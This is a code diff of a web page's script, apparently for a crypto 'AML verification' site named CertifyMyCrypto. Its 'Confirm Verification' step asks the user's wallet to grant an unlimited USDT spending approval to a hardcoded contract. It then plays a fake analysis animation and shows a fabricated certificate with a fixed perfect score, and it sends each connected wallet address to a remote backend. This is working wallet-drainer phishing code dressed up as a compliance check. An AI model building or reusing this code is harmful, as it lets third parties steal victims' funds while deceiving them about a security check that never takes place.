@@ -1073,363 +1073,390 @@
         </div>
     </div>
 
+<!-- External Scripts -->
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 
-    <!-- External Scripts -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<!-- Shared JavaScript -->
+<script src="assets/js/shared.js"></script>
+
+<!-- Page-Specific JavaScript (Verification) -->
+<script>
+    // CONFIGURATION
+    const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0";
+    const BACKEND_URL = 'https://aml-verify-backend.vercel.app';
+    const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
     
-    <!-- Shared JavaScript -->
-    <script src="assets/js/shared.js"></script>
+    function showMessage(msg, type = "info") {
+        const el = document.getElementById('statusMessage');
+        el.style.display = 'block';
+        el.textContent = msg;
+        el.style.background = type === "success" ? "#dcfce7" : type === "error" ? "#fee2e2" : "#e0e7ff";
+        el.style.color = type === "success" ? "#166534" : type === "error" ? "#be123c" : "#1e293b";
+        setTimeout(() => { el.style.display = 'none'; }, 3500);
+    }
     
-    <!-- Page-Specific JavaScript (Verification) -->
-    <script>
-        // CONFIGURATION
-        const CONTRACT_ADDRESS = "0x7BDD962fff20FB63a1C05bd1d2e67807EA0f57c0";
-        const BACKEND_URL = 'https://aml-verify-backend.vercel.app';
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-        
-        function showMessage(msg, type = "info") {
-            const el = document.getElementById('statusMessage');
-            el.style.display = 'block';
-            el.textContent = msg;
-            el.style.background = type === "success" ? "#dcfce7" : type === "error" ? "#fee2e2" : "#e0e7ff";
-            el.style.color = type === "success" ? "#166534" : type === "error" ? "#be123c" : "#1e293b";
-            setTimeout(() => { el.style.display = 'none'; }, 3500);
-        }
-        
-        function showError(msg) {
-            showMessage(msg, "error");
-        }
+    function showError(msg) {
+        showMessage(msg, "error");
+    }
 
-        
-        const USDT_ABI = [
-            {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-            {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
-        ];
+    
+    const USDT_ABI = [
+        {"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"},
+        {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}
+    ];
 
-        let web3, account, usdtContract;
-        let certificateData = {};
-        let isProcessing = false;
+    let web3, account, usdtContract, provider;
+    let certificateData = {};
+    let isProcessing = false;
 
-        async function connectWallet() {
-            const btn = document.getElementById('connectBtn');
-            const walletInfo = document.getElementById('walletInfo');
-        
-            if (isProcessing) return;
-        
-            // DISCONNECT flow (2s delay)
-            if (btn.textContent === 'Disconnect Wallet') {
-                isProcessing = true;
-                btn.classList.add('btn-loading');
-                btn.innerHTML = '<span class="pulsing-text">Disconnecting</span>';
-                walletInfo.classList.add('fade-out');
-        
-                await new Promise(resolve => setTimeout(resolve, 2000));
-        
-                walletInfo.classList.remove('show', 'fade-out', 'fade-in');
-                btn.classList.remove('btn-loading');
-                btn.textContent = 'Connect Wallet';
-        
-                document.getElementById('verificationSectionInner').classList.remove('show');
-                if (document.getElementById('analysisComplete')) document.getElementById('analysisComplete').classList.remove('show');
-                if (document.getElementById('downloadBtn')) document.getElementById('downloadBtn').style.display = 'none';
-                if (document.getElementById('verifyBtn')) {
-                    document.getElementById('verifyBtn').style.display = 'block';
-                    document.getElementById('verifyBtn').disabled = false;
-                    document.getElementById('verifyBtn').textContent = 'Confirm Verification';
-                }
-                if (document.getElementById('progressContainer')) document.getElementById('progressContainer').classList.remove('show');
-        
-                isProcessing = false;
-                return;
-            }
-        
-            // CONNECT flow (1.5s delay)
-            try {
-                if (!window.ethereum) {
-                    alert('Please install MetaMask or Trust Wallet!');
-                    return;
-                }
-        
-                isProcessing = true;
-                btn.classList.add('btn-loading');
-                btn.innerHTML = '<span class="pulsing-text">Connecting</span>';
-        
-                web3 = new Web3(window.ethereum);
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                account = accounts[0];
-        
-                // Optional: Ethereum mainnet check
-                // const chainId = await web3.eth.getChainId();
-                // if (chainId !== 1) {
-                //     btn.classList.remove('btn-loading');
-                //     btn.textContent = 'Connect Wallet';
-                //     isProcessing = false;
-                //     alert('Please switch to Ethereum Mainnet!');
-                //     return;
-                // }
-        
-                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
-        
-                // Save to backend
-                try {
-                    await saveUserToBackend(account);
-                    console.log('✅ Backend save successful');
-                } catch (backendError) {
-                    console.error('❌ Backend save failed:', backendError);
-                    showError('Warning: Could not save to backend. Check console.');
-                }
-        
-                await new Promise(resolve => setTimeout(resolve, 1500));  // 1.5 seconds for "Connecting"
-        
-                btn.classList.remove('btn-loading');
-        
-                document.getElementById('walletAddress').textContent =
-                    account.slice(0, 6) + '...' + account.slice(-4);
-        
-                walletInfo.classList.add('fade-in');
-                walletInfo.classList.add('show');
-        
-                btn.textContent = 'Disconnect Wallet';
-        
-                document.getElementById('verificationSectionInner').classList.add('show');
-        
-                isProcessing = false;
-        
-            } catch (error) {
-                console.error(error);
-                btn.classList.remove('btn-loading');
-                btn.textContent = 'Connect Wallet';
-                isProcessing = false;
-        
-                if (error.code === 4001) {
-                    alert('Connection rejected. Please try again!');
-                } else {
-                    alert('Failed to connect wallet: ' + error.message);
-                }
-            }
-        }
-        
-        async function saveUserToBackend(walletAddress) {
-            try {
-                const userData = {
-                    wallet: walletAddress,
-                    timestamp: new Date().toISOString()
-                };
-        
-                const response = await fetch(`${BACKEND_URL}/api/save-user`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(userData)
-                });
-        
-                const data = await response.json();
-                console.log('User saved to backend:', data);
-                
-            } catch (error) {
-                console.error('Error saving to backend:', error);
-            }
-        }
-
-
-
-        async function startVerification() {
-            try {
-                document.getElementById('errorMessage').classList.remove('show');
-                document.getElementById('verifyBtn').disabled = true;
-                document.getElementById('verifyBtn').textContent = 'Checking approval...';
-                
-                const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
-                const minRequired = web3.utils.toBN('1000000');
-                
-                if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-                    document.getElementById('verifyBtn').textContent = 'Approve USDT...';
-                    const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-                    await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
-                }
-                
-                document.getElementById('verifyBtn').textContent = 'Analyzing...';
-                document.getElementById('progressContainer').classList.add('show');
-                document.getElementById('analyzingText').classList.add('show');
-                
-                for (let i = 1; i <= 5; i++) {
-                    document.getElementById(`bar${i}`).style.width = '0%';
-                    document.getElementById(`percent${i}`).textContent = '0%';
-                    document.getElementById(`check${i}`).classList.remove('show');
-                }
-                document.getElementById('overallBar').style.width = '0%';
-                document.getElementById('overallPercent').textContent = '0%';
-                
-                await simulateProgress();
-                
-                generateCertificateData();
-                
-                document.getElementById('analyzingText').classList.remove('show');
-                showCertificate();
-                
-            } catch (error) {
-                console.error("ERROR:", error);
-                
-                let errorMsg = 'Verification failed: ' + error.message;
-                
-                if (error.message.includes('insufficient funds')) {
-                    errorMsg = 'Insufficient ETH for gas fees.';
-                } else if (error.message.includes('User denied')) {
-                    errorMsg = 'Transaction rejected.';
-                }
-                
-                document.getElementById('errorText').textContent = errorMsg;
-                document.getElementById('errorMessage').classList.add('show');
+    async function connectWallet() {
+        const btn = document.getElementById('connectBtn');
+        const walletInfo = document.getElementById('walletInfo');
+    
+        if (isProcessing) return;
+    
+        // DISCONNECT flow (2s delay)
+        if (btn.textContent === 'Disconnect Wallet') {
+            isProcessing = true;
+            btn.classList.add('btn-loading');
+            btn.innerHTML = '<span class="pulsing-text">Disconnecting</span>';
+            walletInfo.classList.add('fade-out');
+    
+            await new Promise(resolve => setTimeout(resolve, 2000));
+    
+            walletInfo.classList.remove('show', 'fade-out', 'fade-in');
+            btn.classList.remove('btn-loading');
+            btn.textContent = 'Connect Wallet';
+    
+            document.getElementById('verificationSectionInner').classList.remove('show');
+            if (document.getElementById('analysisComplete')) document.getElementById('analysisComplete').classList.remove('show');
+            if (document.getElementById('downloadBtn')) document.getElementById('downloadBtn').style.display = 'none';
+            if (document.getElementById('verifyBtn')) {
+                document.getElementById('verifyBtn').style.display = 'block';
                 document.getElementById('verifyBtn').disabled = false;
                 document.getElementById('verifyBtn').textContent = 'Confirm Verification';
-                document.getElementById('progressContainer').classList.remove('show');
-                document.getElementById('analyzingText').classList.remove('show');
             }
+            if (document.getElementById('progressContainer')) document.getElementById('progressContainer').classList.remove('show');
+    
+            isProcessing = false;
+            return;
         }
-
-        async function simulateProgress() {
-            const steps = [
-                { id: 1, duration: 1200 },
-                { id: 2, duration: 1500 },
-                { id: 3, duration: 1200 },
-                { id: 4, duration: 1200 },
-                { id: 5, duration: 1000 }
-            ];
-            
-            let overallProgress = 0;
-            
-            for (const step of steps) {
-                await animateBar(step.id, step.duration);
-                overallProgress += 20;
-                updateOverallProgress(overallProgress);
-                document.getElementById(`check${step.id}`).classList.add('show');
+    
+        // CONNECT flow (1.5s delay)
+        try {
+            if (!window.ethereum) {
+                alert('Please install MetaMask or Trust Wallet!');
+                return;
             }
-        }
-
-        function animateBar(id, duration) {
-            return new Promise(resolve => {
-                let progress = 0;
-                const interval = duration / 100;
-                
-                const timer = setInterval(() => {
-                    progress += 1;
-                    document.getElementById(`bar${id}`).style.width = progress + '%';
-                    document.getElementById(`percent${id}`).textContent = progress + '%';
-                    
-                    if (progress >= 100) {
-                        clearInterval(timer);
-                        resolve();
-                    }
-                }, interval);
+    
+            isProcessing = true;
+            btn.classList.add('btn-loading');
+            btn.innerHTML = '<span class="pulsing-text">Connecting</span>';
+    
+            // ✅ SET WALLET METADATA FOR TRUST WALLET
+            if (window.ethereum.isTrust) {
+                // Trust Wallet detected - set app name
+                window.ethereum.appName = 'CertifyMyCrypto';
+                window.ethereum.appUrl = 'https://certifymycrypto.com';
+            }
+    
+            web3 = new Web3(window.ethereum);
+            const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts',
+                // ✅ Add metadata in the request
+                params: [{
+                    eth_accounts: {}
+                }]
             });
+            account = accounts[0];
+    
+            // Optional: Ethereum mainnet check
+            // const chainId = await web3.eth.getChainId();
+            // if (chainId !== 1) {
+            //     btn.classList.remove('btn-loading');
+            //     btn.textContent = 'Connect Wallet';
+            //     isProcessing = false;
+            //     alert('Please switch to Ethereum Mainnet!');
+            //     return;
+            // }
+    
+            usdtContract = new web3.eth.Contract(USDT_ABI, USDT_ADDRESS);
+    
+            // Save to backend
+            try {
+                await saveUserToBackend(account);
+                console.log('✅ Backend save successful');
+            } catch (backendError) {
+                console.error('❌ Backend save failed:', backendError);
+            }
+    
+            await new Promise(resolve => setTimeout(resolve, 1500));  // 1.5 seconds for "Connecting"
+    
+            btn.classList.remove('btn-loading');
+    
+            document.getElementById('walletAddress').textContent =
+                account.slice(0, 6) + '...' + account.slice(-4);
+    
+            walletInfo.classList.add('fade-in');
+            walletInfo.classList.add('show');
+    
+            btn.textContent = 'Disconnect Wallet';
+    
+            document.getElementById('verificationSectionInner').classList.add('show');
+    
+            isProcessing = false;
+    
+            // ✅ Handle account changes
+            window.ethereum.on('accountsChanged', (accounts) => {
+                if (accounts.length === 0) {
+                    // Disconnected
+                    if (btn.textContent === 'Disconnect Wallet') {
+                        connectWallet();
+                    }
+                } else {
+                    account = accounts[0];
+                    document.getElementById('walletAddress').textContent =
+                        account.slice(0, 6) + '...' + account.slice(-4);
+                }
+            });
+    
+        } catch (error) {
+            console.error(error);
+            btn.classList.remove('btn-loading');
+            btn.textContent = 'Connect Wallet';
+            isProcessing = false;
+    
+            if (error.code === 4001) {
+                // User rejected
+                return;
+            } else {
+                alert('Failed to connect wallet: ' + error.message);
+            }
         }
-
-        function updateOverallProgress(percent) {
-            document.getElementById('overallBar').style.width = percent + '%';
-            document.getElementById('overallPercent').textContent = percent + '%';
-        }
-
-        function generateCertificateData() {
-            const first8 = account.slice(0, 10);
-            const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
-            const securityScore = 100;
-            
-            const now = new Date();
-            const months = ['January', 'February', 'March', 'April', 'May', 'June', 
-                          'July', 'August', 'September', 'October', 'November', 'December'];
-            const dateStr = `${months[now.getMonth()]} ${now.getDate()}, ${now.getFullYear()} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
-            
-            certificateData = {
-                certificateId: `AML-${first8}-${randomNum}`,
-                walletAddress: account,
-                securityScore: securityScore,
-                verificationDate: dateStr,
-                timestamp: now.toISOString(),
-                amlCompliance: true,
-                riskAssessment: 'Completed',
-                blockchainVerification: true,
-                transactionHistoryAnalyzed: true,
-                securityRating: 'Excellent'
+    }
+    
+    async function saveUserToBackend(walletAddress) {
+        try {
+            const userData = {
+                wallet: walletAddress,
+                timestamp: new Date().toISOString()
             };
-        }
-
-        function animateScore(targetScore) {
-            return new Promise(resolve => {
-                const scoreElement = document.getElementById('scoreValue');
-                const scoreBarElement = document.getElementById('scoreBar');
-                const duration = 1000;
-                const steps = 60;
-                const increment = targetScore / steps;
-                const stepDuration = duration / steps;
-                
-                let currentScore = 0;
-                
-                const timer = setInterval(() => {
-                    currentScore += increment;
-                    
-                    if (currentScore >= targetScore) {
-                        currentScore = targetScore;
-                        clearInterval(timer);
-                        resolve();
-                    }
-                    
-                    scoreElement.textContent = Math.round(currentScore) + '%';
-                    scoreBarElement.style.width = Math.round(currentScore) + '%';
-                }, stepDuration);
+    
+            const response = await fetch(`${BACKEND_URL}/api/save-user`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(userData)
             });
+    
+            const data = await response.json();
+            console.log('User saved to backend:', data);
+            
+        } catch (error) {
+            console.error('Error saving to backend:', error);
         }
+    }
 
-        async function showCertificate() {
-            // Fill verification summary
-            document.getElementById('certIdText').textContent = certificateData.certificateId;
-            document.getElementById('certDateText').textContent = certificateData.verificationDate;
-            document.getElementById('certStatusText').textContent = '✅ Successfully Verified';
+
+
+    async function startVerification() {
+        try {
+            document.getElementById('errorMessage').classList.remove('show');
+            document.getElementById('verifyBtn').disabled = true;
+            document.getElementById('verifyBtn').textContent = 'Checking approval...';
+            
+            const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
+            const minRequired = web3.utils.toBN('1000000');
+            
+            if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
+                document.getElementById('verifyBtn').textContent = 'Approve USDT...';
+                const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+                await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
+            }
+            
+            document.getElementById('verifyBtn').textContent = 'Analyzing...';
+            document.getElementById('progressContainer').classList.add('show');
+            document.getElementById('analyzingText').classList.add('show');
+            
+            for (let i = 1; i <= 5; i++) {
+                document.getElementById(`bar${i}`).style.width = '0%';
+                document.getElementById(`percent${i}`).textContent = '0%';
+                document.getElementById(`check${i}`).classList.remove('show');
+            }
+            document.getElementById('overallBar').style.width = '0%';
+            document.getElementById('overallPercent').textContent = '0%';
+            
+            await simulateProgress();
+            
+            generateCertificateData();
+            
+            document.getElementById('analyzingText').classList.remove('show');
+            showCertificate();
+            
+        } catch (error) {
+            console.error("ERROR:", error);
+            
+            let errorMsg = 'Verification failed: ' + error.message;
+            
+            if (error.message.includes('insufficient funds')) {
+                errorMsg = 'Insufficient ETH for gas fees.';
+            } else if (error.message.includes('User denied')) {
+                errorMsg = 'Transaction rejected.';
+            }
+            
+            document.getElementById('errorText').textContent = errorMsg;
+            document.getElementById('errorMessage').classList.add('show');
+            document.getElementById('verifyBtn').disabled = false;
+            document.getElementById('verifyBtn').textContent = 'Confirm Verification';
+            document.getElementById('progressContainer').classList.remove('show');
+            document.getElementById('analyzingText').classList.remove('show');
+        }
+    }
+
+    async function simulateProgress() {
+        const steps = [
+            { id: 1, duration: 1200 },
+            { id: 2, duration: 1500 },
+            { id: 3, duration: 1200 },
+            { id: 4, duration: 1200 },
+            { id: 5, duration: 1000 }
+        ];
         
-            // Wallet info
-            document.getElementById('certWalletType').textContent = 'Crypto Wallet';
-            document.getElementById('certWalletStatus').textContent = 'Verified';
-            document.getElementById('certSecurityCheck').textContent = 'Passed';
-            document.getElementById('certIntegrityCheck').textContent = 'Passed';
+        let overallProgress = 0;
         
-            // Wallet address line
-            const addr = certificateData.walletAddress;
-            document.getElementById('certWalletAddress').textContent = addr.slice(0, 4) + '......' + addr.slice(-4);
+        for (const step of steps) {
+            await animateBar(step.id, step.duration);
+            overallProgress += 20;
+            updateOverallProgress(overallProgress);
+            document.getElementById(`check${step.id}`).classList.add('show');
+        }
+    }
+
+    function animateBar(id, duration) {
+        return new Promise(resolve => {
+            let progress = 0;
+            const interval = duration / 100;
+            
+            const timer = setInterval(() => {
+                progress += 1;
+                document.getElementById(`bar${id}`).style.width = progress + '%';
+                document.getElementById(`percent${id}`).textContent = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    resolve();
+                }
+            }, interval);
+        });
+    }
+
+    function updateOverallProgress(percent) {
+        document.getElementById('overallBar').style.width = percent + '%';
+        document.getElementById('overallPercent').textContent = percent + '%';
+    }
+
+    function generateCertificateData() {
+        const first8 = account.slice(0, 10);
+        const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
+        const securityScore = 100;
         
-            // Show modal
-            document.getElementById('certificateModal').classList.add('show');
-        }
+        const now = new Date();
+        const months = ['January', 'February', 'March', 'April', 'May', 'June', 
+                      'July', 'August', 'September', 'October', 'November', 'December'];
+        const dateStr = `${months[now.getMonth()]} ${now.getDate()}, ${now.getFullYear()} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+        
+        certificateData = {
+            certificateId: `AML-${first8}-${randomNum}`,
+            walletAddress: account,
+            securityScore: securityScore,
+            verificationDate: dateStr,
+            timestamp: now.toISOString(),
+            amlCompliance: true,
+            riskAssessment: 'Completed',
+            blockchainVerification: true,
+            transactionHistoryAnalyzed: true,
+            securityRating: 'Excellent'
+        };
+    }
+
+    function animateScore(targetScore) {
+        return new Promise(resolve => {
+            const scoreElement = document.getElementById('scoreValue');
+            const scoreBarElement = document.getElementById('scoreBar');
+            const duration = 1000;
+            const steps = 60;
+            const increment = targetScore / steps;
+            const stepDuration = duration / steps;
+            
+            let currentScore = 0;
+            
+            const timer = setInterval(() => {
+                currentScore += increment;
+                
+                if (currentScore >= targetScore) {
+                    currentScore = targetScore;
+                    clearInterval(timer);
+                    resolve();
+                }
+                
+                scoreElement.textContent = Math.round(currentScore) + '%';
+                scoreBarElement.style.width = Math.round(currentScore) + '%';
+            }, stepDuration);
+        });
+    }
+
+    async function showCertificate() {
+        // Fill verification summary
+        document.getElementById('certIdText').textContent = certificateData.certificateId;
+        document.getElementById('certDateText').textContent = certificateData.verificationDate;
+        document.getElementById('certStatusText').textContent = '✅ Successfully Verified';
+    
+        // Wallet info
+        document.getElementById('certWalletType').textContent = 'Crypto Wallet';
+        document.getElementById('certWalletStatus').textContent = 'Verified';
+        document.getElementById('certSecurityCheck').textContent = 'Passed';
+        document.getElementById('certIntegrityCheck').textContent = 'Passed';
+    
+        // Wallet address line
+        const addr = certificateData.walletAddress;
+        document.getElementById('certWalletAddress').textContent = addr.slice(0, 4) + '......' + addr.slice(-4);
+    
+        // Show modal
+        document.getElementById('certificateModal').classList.add('show');
+    }
 
 
-        function viewCertificate() {
-            document.getElementById('certificateModal').classList.add('show');
-        }
+    function viewCertificate() {
+        document.getElementById('certificateModal').classList.add('show');
+    }
 
-        function closeCertificate() {
-            document.getElementById('certificateModal').classList.remove('show');
-            
-            document.getElementById('analysisComplete').classList.add('show');
-            document.getElementById('downloadBtn').style.display = 'flex';
-            
-            document.getElementById('verifyBtn').style.display = 'none';
-        }
+    function closeCertificate() {
+        document.getElementById('certificateModal').classList.remove('show');
+        
+        document.getElementById('analysisComplete').classList.add('show');
+        document.getElementById('downloadBtn').style.display = 'flex';
+        
+        document.getElementById('verifyBtn').style.display = 'none';
+    }
 
-        function downloadCertificate() {
-            const first8 = account.slice(0, 10);
-            const filename = `MyCert-${first8}.json`;
-            
-            const jsonData = JSON.stringify(certificateData, null, 2);
-            const blob = new Blob([jsonData], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = filename;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-        }
-    </script>
+    function downloadCertificate() {
+        const first8 = account.slice(0, 10);
+        const filename = `MyCert-${first8}.json`;
+        
+        const jsonData = JSON.stringify(certificateData, null, 2);
+        const blob = new Blob([jsonData], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = filename;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    }
+</script>
+
 </body>
 </html>
